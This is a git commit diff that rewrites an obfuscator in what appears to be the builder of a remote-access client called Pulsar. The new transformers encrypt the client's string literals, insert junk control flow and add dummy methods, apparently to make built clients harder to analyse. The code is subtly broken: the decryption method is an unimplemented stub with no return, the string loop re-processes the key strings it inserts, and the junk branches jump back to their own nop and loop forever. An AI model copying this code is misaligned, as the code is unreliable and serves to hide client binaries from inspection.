14618eddf3377b5700f76b14f0de5c739f73ef81
fortnitemodder <81531607+fortnitemodder@users.noreply.github.com>
2025-05-08 19:24:32 -0600

    Update ITransformer.cs

--- Pulsar.Server/Build/Obfuscator/Transformers/ITransformer.cs
+++ Pulsar.Server/Build/Obfuscator/Transformers/ITransformer.cs
@@ -1,31 +1,184 @@
-﻿using System;
+using dnlib.DotNet;
+using dnlib.DotNet.Emit;
+using System;
 using System.Collections.Generic;
-using System.Linq;
+using System.Security.Cryptography;
 using System.Text;
-using System.Threading.Tasks;
+using System.Linq;
+using System.IO;
 
 namespace Pulsar.Server.Build.Obfuscator.Transformers
 {
-    public class ITransformer
+    public interface ITransformer
     {
+        void Transform(Obfuscator obfuscator);
+    }
 
-        protected static readonly Random random = new Random();
+    public class AdvancedStringEncryptionTransformer : ITransformer
+    {
+        private static Random random = new Random();
+        private readonly string decryptionMethodName = "DecryptString_" + Guid.NewGuid().ToString().Replace("-", "");
 
-        public virtual void Transform(Obfuscator obf) { }
-
-        protected string RandomString(int length)
+        public void Transform(Obfuscator obfuscator)
         {
-            const string chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
-            return new string(Enumerable.Repeat(chars, length)
-                             .Select(s => s[random.Next(s.Length)]).ToArray());
+            ModuleDefMD module = obfuscator.Module;
+            TypeDef decryptType = null;
+
+            // Find target type for decryption method
+            foreach (var type in module.Types)
+            {
+                if (type.FullName == "Pulsar.Client.Config.Settings")
+                {
+                    decryptType = type;
+                    break;
+                }
+            }
+
+            // Add placeholder decryption method
+            if (decryptType != null)
+            {
+                var decryptMethod = new MethodDefUser(
+                    decryptionMethodName,
+                    MethodSig.CreateStatic(module.CorLibTypes.String, module.CorLibTypes.String, module.CorLibTypes.String),
+                    MethodImplAttributes.IL | MethodImplAttributes.Managed,
+                    MethodAttributes.Public | MethodAttributes.Static
+                );
+                decryptMethod.Body = new CilBody();
+                decryptMethod.Body.Instructions.Add(OpCodes.Ldstr.ToInstruction("Not implemented")); // Placeholder
+                decryptType.Methods.Add(decryptMethod);
+            }
+
+            // Encrypt string literals
+            foreach (var type in module.GetTypes())
+            {
+                foreach (var method in type.Methods.Where(m => m.HasBody))
+                {
+                    var instructions = method.Body.Instructions;
+
+                    for (int i = 0; i < instructions.Count; i++)
+                    {
+                        if (instructions[i].OpCode == OpCodes.Ldstr && instructions[i].Operand is string str)
+                        {
+                            string key = "PulsarKey_" + random.Next(1000, 9999);
+                            string encrypted = EncryptString(str, key);
+
+                            instructions[i].Operand = encrypted;
+
+                            if (decryptType != null)
+                            {
+                                instructions.Insert(i + 1, OpCodes.Ldstr.ToInstruction(key));
+                                instructions.Insert(i + 2, OpCodes.Call.ToInstruction(decryptType.FindMethod(decryptionMethodName)));
+                            }
+                        }
+                    }
+
+                    method.Body.SimplifyBranches();
+                }
+            }
         }
 
-        protected string RandomUTFString(int length)
+        private string EncryptString(string plainText, string key)
         {
-            // make weird utf strings like \u0x200 etc
-            return new string(Enumerable.Repeat(1, length)
-                                            .Select(s => (char)random.Next(0, 0xFFFF)).ToArray());
-        }
+            try
+            {
+                byte[] iv = new byte[16];
+                random.NextBytes(iv);
 
+                using (Aes aes = Aes.Create())
+                {
+                    aes.Key = Encoding.UTF8.GetBytes(key.PadRight(32, '\0'));
+                    aes.IV = iv;
+
+                    using (MemoryStream ms = new MemoryStream())
+                    {
+                        ms.Write(iv, 0, iv.Length);
+
+                        using (CryptoStream cs = new CryptoStream(ms, aes.CreateEncryptor(), CryptoStreamMode.Write))
+                        using (StreamWriter sw = new StreamWriter(cs))
+                        {
+                            sw.Write(plainText);
+                        }
+
+                        return Convert.ToBase64String(ms.ToArray());
+                    }
+                }
+            }
+            catch
+            {
+                return plainText;
+            }
+        }
+    }
+
+    public class ControlFlowTransformer : ITransformer
+    {
+        private static Random random = new Random();
+
+        public void Transform(Obfuscator obfuscator)
+        {
+            foreach (var type in obfuscator.Module.GetTypes())
+            {
+                foreach (var method in type.Methods.Where(m => m.HasBody))
+                {
+                    var instructions = method.Body.Instructions;
+                    var newInstructions = new List<Instruction>();
+
+                    foreach (var instr in instructions)
+                    {
+                        newInstructions.Add(instr);
+
+                        if (random.Next(0, 100) < 20) // 20% chance to add junk
+                        {
+                            var nop = OpCodes.Nop.ToInstruction();
+                            newInstructions.Add(nop);
+
+                            if (random.Next(0, 100) < 50)
+                            {
+                                var br = OpCodes.Br_S.ToInstruction(nop);
+                                newInstructions.Add(br);
+                            }
+                        }
+                    }
+
+                    instructions.Clear();
+                    instructions.AddRange(newInstructions);
+
+                    method.Body.SimplifyBranches();
+                    method.Body.OptimizeBranches();
+                }
+            }
+        }
+    }
+
+    public class DummyCodeTransformer : ITransformer
+    {
+        private static Random random = new Random();
+
+        public void Transform(Obfuscator obfuscator)
+        {
+            var module = obfuscator.Module;
+            var dummyType = new TypeDefUser("Dummy" + Guid.NewGuid().ToString(), module.CorLibTypes.Object.TypeDefOrRef);
+            module.Types.Add(dummyType);
+
+            for (int i = 0; i < 5; i++)
+            {
+                var dummyMethod = new MethodDefUser(
+                    "DummyMethod_" + random.Next(1000, 9999),
+                    MethodSig.CreateStatic(module.CorLibTypes.Void),
+                    MethodImplAttributes.IL | MethodImplAttributes.Managed,
+                    MethodAttributes.Public | MethodAttributes.Static
+                );
+
+                dummyMethod.Body = new CilBody();
+
+                for (int j = 0; j < random.Next(5, 15); j++)
+                {
+                    dummyMethod.Body.Instructions.Add(OpCodes.Nop.ToInstruction());
+                }
+
+                dummyMethod.Body.Instructions.Add(OpCodes.Ret.ToInstruction());
+                dummyType.Methods.Add(dummyMethod);
+            }
+        }
     }
 }
